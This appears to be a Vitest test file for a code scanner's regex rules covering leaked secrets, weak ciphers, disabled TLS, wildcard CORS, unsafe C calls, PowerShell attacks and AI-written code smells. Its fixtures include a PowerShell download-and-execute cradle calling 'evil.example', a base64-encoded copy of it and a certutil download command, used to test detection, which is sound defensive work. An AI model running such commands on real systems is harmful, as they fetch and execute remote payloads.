/**
 * Regex-Engine-Tests — pro Regel mindestens ein Positiv- und ein
 * Negativ-Fixture (pre_scanner_design.md §8, Phase v1).
 */
import { describe, expect, it } from 'vitest';
import { runRegexEngine, shannonEntropy } from './regex-engine';
import type { PrescanLanguage } from '../language';

function scanLines(language: PrescanLanguage, sourceLines: readonly string[]) {
    const lineMap = new Map<number, string>();
    sourceLines.forEach((lineText, lineIndex) => lineMap.set(lineIndex + 1, lineText));
    return runRegexEngine({ path: `fixture.${language}`, language, lines: lineMap });
}

function ruleIdsOf(findings: readonly { ruleId: string }[]): string[] {
    return findings.map((finding) => finding.ruleId);
}

describe('SEC-005 — hardcoded secrets', () => {
    it('flags provider-format secrets (AWS, GitHub, PEM, JWT)', () => {
        const secretFindings = scanLines('typescript', [
            'const awsAccessKey = "AKIAIOSFODNN7EXAMPLE";',
            'const githubPat = "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz0123456789";',
            '-----BEGIN RSA PRIVATE KEY-----',
        ]);
        expect(ruleIdsOf(secretFindings)).toEqual(['SEC-005', 'SEC-005', 'SEC-005']);
    });

    it('flags high-entropy literals assigned to secret-named variables', () => {
        const secretFindings = scanLines('python', [
            'api_key = "9fKq2zXv8Rt4Wm7nB3jLp6Yh1Gd5Sc0A"',
        ]);
        expect(ruleIdsOf(secretFindings)).toEqual(['SEC-005']);
    });

    it('ignores env lookups and low-entropy placeholders', () => {
        const cleanFindings = scanLines('typescript', [
            'const apiKey = process.env.API_KEY;',
            'const tokenLabel = "aaaaaaaaaaaaaaaaaaaa";',
        ]);
        expect(cleanFindings).toHaveLength(0);
    });

    it('computes Shannon entropy correctly for uniform strings', () => {
        expect(shannonEntropy('aaaa')).toBe(0);
        expect(shannonEntropy('abcd')).toBe(2);
    });
});

describe('SEC-014 / SEC-015 — weak hash & cipher', () => {
    it('flags MD5/SHA-1 in hashing APIs and ECB/DES ciphers', () => {
        const javaFindings = scanLines('java', [
            'MessageDigest digest = MessageDigest.getInstance("MD5");',
            'Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");',
            'Cipher legacy = Cipher.getInstance("AES");',
        ]);
        expect(ruleIdsOf(javaFindings)).toEqual(['SEC-014', 'SEC-015', 'SEC-015']);
    });

    it('accepts SHA-256 and AES-GCM', () => {
        const cleanFindings = scanLines('java', [
            'MessageDigest digest = MessageDigest.getInstance("SHA-256");',
            'Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");',
        ]);
        expect(cleanFindings).toHaveLength(0);
    });
});

describe('SEC-017 / SEC-024 — TLS & CORS', () => {
    it('flags disabled TLS verification across ecosystems', () => {
        const tlsFindings = scanLines('python', [
            'requests.get(url, verify=False)',
        ]);
        const nodeTlsFindings = scanLines('typescript', [
            'const agent = new https.Agent({ rejectUnauthorized: false });',
        ]);
        expect(ruleIdsOf(tlsFindings)).toEqual(['SEC-017']);
        expect(ruleIdsOf(nodeTlsFindings)).toEqual(['SEC-017']);
    });

    it('flags wildcard CORS but not exact origins', () => {
        const corsFindings = scanLines('typescript', [
            "res.setHeader('Access-Control-Allow-Origin', '*');",
            "res.setHeader('Access-Control-Allow-Origin', 'https://app.example.com');",
        ]);
        expect(ruleIdsOf(corsFindings)).toEqual(['SEC-024']);
    });
});

describe('SEC-027 / SEC-029 — C banned APIs', () => {
    it('flags unbounded scanf and banned libc functions in C only', () => {
        const cFindings = scanLines('c', [
            'scanf("%s", userInput);',
            'strcpy(destinationBuffer, sourceInput);',
        ]);
        expect(ruleIdsOf(cFindings)).toEqual(['SEC-027', 'SEC-029']);

        const boundedScanf = scanLines('c', ['scanf("%63s", userInput);']);
        expect(boundedScanf).toHaveLength(0);

        const nonCContent = scanLines('typescript', ['const gets = (value: string) => value;']);
        expect(nonCContent).toHaveLength(0);
    });
});

describe('SEC-048/049/050 — PowerShell & LOLBins', () => {
    it('flags download cradles and policy bypasses in PowerShell', () => {
        const psFindings = scanLines('powershell', [
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')",
            'powershell -ExecutionPolicy Bypass -File deploy.ps1',
        ]);
        expect(ruleIdsOf(psFindings)).toContain('SEC-048');
        expect(ruleIdsOf(psFindings)).toContain('SEC-049');
    });

    it('decodes -EncodedCommand payloads before scanning (PROC-013)', () => {
        const cradlePayload = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p')";
        const encodedPayload = Buffer.from(cradlePayload, 'utf16le').toString('base64');
        const decodedFindings = scanLines('powershell', [
            `powershell.exe -EncodedCommand ${encodedPayload}`,
        ]);
        expect(ruleIdsOf(decodedFindings)).toContain('SEC-048');
    });

    it('flags credential-dumping tool patterns in any language', () => {
        const lolbinFindings = scanLines('yaml', [
            '  command: certutil -urlcache -split -f http://evil.example/tool.exe',
        ]);
        expect(ruleIdsOf(lolbinFindings)).toContain('SEC-050');
    });
});

describe('MAINT-005 / MAINT-006 — overblanking & AI-SATD', () => {
    it('flags more than two consecutive blank lines', () => {
        const blankFindings = scanLines('typescript', ['const first = 1;', '', '', '', 'const second = 2;']);
        expect(ruleIdsOf(blankFindings)).toEqual(['MAINT-005']);
    });

    it('allows exactly two blank lines', () => {
        const cleanFindings = scanLines('typescript', ['const first = 1;', '', '', 'const second = 2;']);
        expect(cleanFindings).toHaveLength(0);
    });

    it('flags AI-attributed TODOs without a ticket, allows ticketed ones', () => {
        const satdFindings = scanLines('typescript', [
            '// TODO: copilot generated this, verify the edge cases',
            '// TODO(UNSLOP-42): chatgpt suggested this refactor',
        ]);
        expect(ruleIdsOf(satdFindings)).toEqual(['MAINT-006']);
    });
});

describe('HAL-002 — hallucinated stdlib APIs (Go)', () => {
    it('flags strings.ToLowerCase / fmt.Printfln in Go', () => {
        const hallucinatedFindings = scanLines('go', [
            'normalized := strings.ToLowerCase(trimmedHandle)',
            'fmt.Printfln("done: %s", normalized)',
        ]);
        expect(ruleIdsOf(hallucinatedFindings)).toEqual(['HAL-002', 'HAL-002']);
    });

    it('accepts the real Go APIs and never fires outside Go', () => {
        const realApiFindings = scanLines('go', [
            'normalized := strings.ToLower(trimmedHandle)',
            'upper := strings.ToUpper(handle)',
        ]);
        expect(ruleIdsOf(realApiFindings)).toHaveLength(0);

        const typescriptFindings = scanLines('typescript', [
            'const normalized = strings.ToLowerCase(handle);',
        ]);
        expect(ruleIdsOf(typescriptFindings)).toHaveLength(0);
    });
});
